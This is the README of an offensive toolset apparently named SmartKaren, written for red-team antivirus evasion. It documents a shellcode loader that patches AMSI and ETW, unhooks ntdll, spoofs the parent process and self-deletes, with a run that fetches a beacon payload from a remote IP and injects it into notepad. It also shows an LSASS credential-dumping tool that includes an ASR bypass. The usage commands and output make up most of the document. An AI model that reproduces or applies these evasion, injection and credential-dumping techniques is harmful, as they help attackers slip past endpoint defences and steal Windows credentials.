# SmartKaren
A series of custom offensive toolset and utilities written in C# and Rust. This project is developed to explore AV evasion techniques for aiding red teaming operations. 

## KarenLdr
KarenLdr is a compact Process Injector with various evasion techniques such as AMSI bypass and ETW patching built-in to it. To evade static signature, KarenLdr leverages low level NT*API calls (with the exception of AMSI & ETW patching) and a modified version of D/Invoke library. 

At it's core, KarenLdr leverages a combination of `NtMapViewSection` and `NtQueueApcThread` to steer away from the classic process injection method of `VirtualAlloc`, `VirtualProtect` and `CreateThread` that are heavily signatured. To achieve this, the remote process is spawned under a suspended state by tampering the Process Creation Flag with `CREATE_SUSPENDED`. This technique is useful in bypassing Attack Surface Reduction (ASR) rule that blocks the creation of threads.

At runtime, a fresh copy of `ntdll.dll` is loaded into the process. The original ntdll.dll that was hooked by EDR is left untouched. All NT*API are then exported and called from the clean copy of ntdll.dll instead. This EDR evasion method is especially effective because the integrity of EDR hooks are not tampered with. Alternatively, direct syscalls can also be enabled by specifying the `--syscall` flag.

Additionally, it also supports Parent Process ID (PPID) Spoofing, allowing the sacrificial process to spawn under an arbitrary process using it's PID. If the target `-t, --target` is not specified, it will perform self-injection instead. At the end of execution, the executable file will be wipped from disk automatically to erase traces.

**Future Enhancement:** Indirect Syscalls & Threadless Injection
```
C:\>KarenLdr.exe -u "https://192.168.231.128:443/beacon.bin" -t notepad -p 9524 -k 
     _        _______  _______  _______  _        _        ______   _______
    | \    /\(  ___  )(  ____ )(  ____ \( (    /|( \      (  __  \ (  ____ )
    |  \  / /| (   ) || (    )|| (    \/|  \  ( || (      | (  \  )| (    )|
    |  (_/ / | (___) || (____)|| (__    |   \ | || |      | |   ) || (____)|
    |   _ (  |  ___  ||     __)|  __)   | (\ \) || |      | |   | ||     __)
    |  ( \ \ | (   ) || (\ (   | (      | | \   || |      | |   ) || (\ (
    |  /  \ \| )   ( || ) \ \__| (____/\| )  \  || (____/\| (__/  )| ) \ \__
    |_/    \/|/     \||/   \__/(_______/|/    )_)(_______/(______/ |/   \__/

 KarenLdr: D/Invoke + NT*API + Manual Mapping + Direct Syscall + AMSI & ETW Patching + PPID Spoofing

  -u, --url      Required. Remote URL address for raw shellcode.

  -t, --target   Specify the target/victim process. Default: Self-injection

  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)

  -k, --kill     Enable self-destruct to auto wipe file from disk.

  -s, --syscall  Enable Direct Syscall. Default: Manual Mapping

  -h, --help     Display help screen manual.
  
|--------------
| Payload       : https://192.168.231.128:443/beacon.bin
| Process       : C:\Windows\System32\notepad.exe
| PPID Spoofing : 9524
| Self Destruct : True
|--------------

[>] Patching Event Tracing for Windows (ETW)
    |-> Address of ntdll.dll: 0x7FFD8DEF0000
    |-> Location of EtwEventWrite(): 0x7FFD8DF3F1F0
    |-> Patching Memory: 0x00000020 -> 0x04
    |-> Restoring Memory: 0x04 -> 0x00000020

[>] Patching Anti Malware Scan Interface (AMSI)
    |-> Address of AmsiScanBuffer(): 0x7FFD75B83860
    |-> Successfully Patched AMSI!

[>] CreateProcessW()
    |-> Target Process Created!
    |-> PID: 22232

[>] Fetching Payload
    |-> Payload Retrieved Successfully!

[>] Resolving Addresses of ntdll.dll
    |-> Original ntdll.dll: 0x7ffd8def0000
    |-> New copy of ntdll.dll: 0x29cb56e0000

[>] NtCreateSection()
    |-> New Section Created!

[>] NtMapViewOfSection()
    |-> New Section Mapped!

[>] Copied Shellcode to Memory!

[>] NtMapViewOfSection()
    |-> Memory Region Mapped to Target Process!
    |-> Base Address: 0x209ED370000

[>] NtQueueApcThread()
    |-> Queueing APC!

[>] NtSetInformationThread()
    |-> Thread Priority Set!

[>] NtResumeThread()
    |-> Resuming Thread!

[>] DeleteProcThreadAttributeList()
    |-> Deleting Process Artifacts!

[>] CloseHandle()
    |-> Closing Process Handle!

[>] CloseHandle()
    |-> Closing Thread Handle!

[>] KarenLdr.exe removed from disk!
```

## KarenDumpedMi
```
**Method 1:**
C:\>KarenDumpedMi.exe

     _        _______  _______  _______  _        ______            _______  _______  _______  ______   _______ _________
    | \    /\(  ___  )(  ____ )(  ____ \( (    /|(  __  \ |\     /|(       )(  ____ )(  ____ \(  __  \ (       )\__   __/
    |  \  / /| (   ) || (    )|| (    \/|  \  ( || (  \  )| )   ( || () () || (    )|| (    \/| (  \  )| () () |   ) (
    |  (_/ / | (___) || (____)|| (__    |   \ | || |   ) || |   | || || || || (____)|| (__    | |   ) || || || |   | |
    |   _ (  |  ___  ||     __)|  __)   | (\ \) || |   | || |   | || |(_)| ||  _____)|  __)   | |   | || |(_)| |   | |
    |  ( \ \ | (   ) || (\ (   | (      | | \   || |   ) || |   | || |   | || (      | (      | |   ) || |   | |   | |
    |  /  \ \| )   ( || ) \ \__| (____/\| )  \  || (__/  )| (___) || )   ( || )      | (____/\| (__/  )| )   ( |___) (___
    |_/    \/|/     \||/   \__/(_______/|/    )_)(______/ (_______)|/     \||/       (_______/(______/ |/     \|\_______/

[>] Finding Alive Process
    |-> Found lsass.exe
    |-> PID: 920

[>] Finding MiniDumpWriteDump
    |-> Location of MiniDumpWriteDump(): 0x7FFD7E8F6C50

[>] Getting Handles
    |-> Process Handle: 0x2CC
    |-> File Handle (karen.dmp): 0x2C4

[>] Invoking MiniDumpWriteDump
    |-> Successfully Called MiniDumpWriteDump()
    |-> COMPLETED! You can now parse karen.dmp!
    
**Method 2:**
C:\>KarenDumpedMi.exe

     _        _______  _______  _______  _        ______            _______  _______  _______  ______   _______ _________
    | \    /\(  ___  )(  ____ )(  ____ \( (    /|(  __  \ |\     /|(       )(  ____ )(  ____ \(  __  \ (       )\__   __/
    |  \  / /| (   ) || (    )|| (    \/|  \  ( || (  \  )| )   ( || () () || (    )|| (    \/| (  \  )| () () |   ) (
    |  (_/ / | (___) || (____)|| (__    |   \ | || |   ) || |   | || || || || (____)|| (__    | |   ) || || || |   | |
    |   _ (  |  ___  ||     __)|  __)   | (\ \) || |   | || |   | || |(_)| ||  _____)|  __)   | |   | || |(_)| |   | |
    |  ( \ \ | (   ) || (\ (   | (      | | \   || |   ) || |   | || |   | || (      | (      | |   ) || |   | |   | |
    |  /  \ \| )   ( || ) \ \__| (____/\| )  \  || (__/  )| (___) || )   ( || )      | (____/\| (__/  )| )   ( |___) (___
    |_/    \/|/     \||/   \__/(_______/|/    )_)(______/ (_______)|/     \||/       (_______/(______/ |/     \|\_______/

[>] Finding Alive Process
    |-> Found lsass.exe
    |-> PID: 920

[>] Finding MiniDumpWriteDump
    |-> Location of MiniDumpWriteDump(): 0x7FFD7E8F6C50

[>] Getting Handles
    |-> Unable to Open Process Handle!

[>] Method 1 Failed! Trying Method 2
    |-> Dumping LSASS With ASR Bypass!

[>] Spawning WmiPrvSE.exe
    |-> PID: 20856

[>] COMPLETED! You can now parse lsass.dmp!
```

## Karen2Gadget
